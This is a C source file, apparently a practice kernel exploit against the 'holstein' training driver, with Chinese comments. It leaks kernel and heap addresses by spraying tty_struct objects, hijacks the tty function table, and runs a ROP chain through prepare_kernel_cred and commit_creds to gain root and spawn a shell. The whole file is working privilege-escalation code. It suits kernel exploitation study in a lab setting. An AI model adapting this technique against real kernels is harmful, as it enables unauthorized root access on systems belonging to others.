#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define OPS_OFFSET 0xc38880
#define SPRAY_NUM 100
#define VULN_DRV "/dev/holstein"

uint64_t kernel_base = 0;
uint64_t base = 0xffffffff81000000;
uint64_t g_buf = 0;
int global_fd = 0;

void spawn_shell();

// uint64_t stack_pivot = 0xffffffff81516264; //no SMEP
uint64_t stack_pivot = 0xffffffff813a478a;

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff81074650;
uint64_t commit_creds = 0xffffffff810744b0;
uint64_t pop_rdi_ret = 0xffffffff8128b79c;
uint64_t mov_rdi_rax_ret = 0xffffffff8162707b;
uint64_t pop_rcx_ret = 0xffffffff814d52dc;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e10;
uint64_t user_rip = (uint64_t)spawn_shell;

void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
  puts("[+] win!");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

int main() {
  save_userland_state();

  int spray[SPRAY_NUM];
  for (int i = 0; i < SPRAY_NUM / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  global_fd = open("/dev/holstein", O_RDWR);
  if (global_fd == -1)
    perror("open");

  for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  char buf[0x500];
  read(global_fd, buf, 0x500);
  kernel_base = *(uint64_t *)&buf[0x418] - OPS_OFFSET;
  printf("[+] kernel base: 0x%lx\n", kernel_base);
  g_buf = *(uint64_t *)&buf[0x438] - 0x438;
  printf("[+] heap base: 0x%lx\n", g_buf);

  uint64_t *rop_chain = (uint64_t *)&buf;
  // for (int i = 0; i < 0x40; i++)   // 随便填入几个函数地址进行验证
  //   //*p++ = 0xffffffffdead0000 + i;  // 0xffffffffdead0c00
  *rop_chain++ = pop_rdi_ret - base + kernel_base;         // 0
  *rop_chain++ = 0;                                        // 1
  *rop_chain++ = prepare_kernel_cred - base + kernel_base; // 2
  *rop_chain++ = pop_rcx_ret - base + kernel_base;         // 3
  *rop_chain++ = 0;                                        // 4
  *rop_chain++ = mov_rdi_rax_ret - base + kernel_base;     // 5
  *rop_chain++ = commit_creds - base + kernel_base;        // 6
  *rop_chain++ =
      pop_rcx_ret - base +
      kernel_base; // 7 这里的pop
                   // rcx没有什么实际意义，只是作为一个“滑坡”指令把劫持rsp的那个指令滑掉
  *rop_chain++ = 0;                                // 8
  *rop_chain++ = pop_rcx_ret - base + kernel_base; // 9
  *rop_chain++ = 0;                                // a
  *rop_chain++ = pop_rcx_ret - base + kernel_base; // b
  *rop_chain++ = stack_pivot - base + kernel_base; // c
  *rop_chain++ =
      swapgs_restore_regs_and_return_to_usermode - base + kernel_base + 22;
  *rop_chain++ = 0;
  *rop_chain++ = 0;
  *rop_chain++ = user_rip;
  *rop_chain++ = user_cs;
  *rop_chain++ = user_rflags;
  *rop_chain++ = user_sp;
  *rop_chain++ = user_ss;
  *(uint64_t *)&buf[0x418] = g_buf; // 劫持tty_struct的函数表为g_buf
  write(global_fd, buf, 0x420);
  for (int i = 0; i < SPRAY_NUM; i++) {
    ioctl(spray[i], g_buf - 0x10, g_buf - 0x10); // 触发劫持,完成stack pivot
  }

  close(global_fd);

  for (int i = 0; i < SPRAY_NUM; i++) {
    close(spray[i]);
  }

  return 0;
}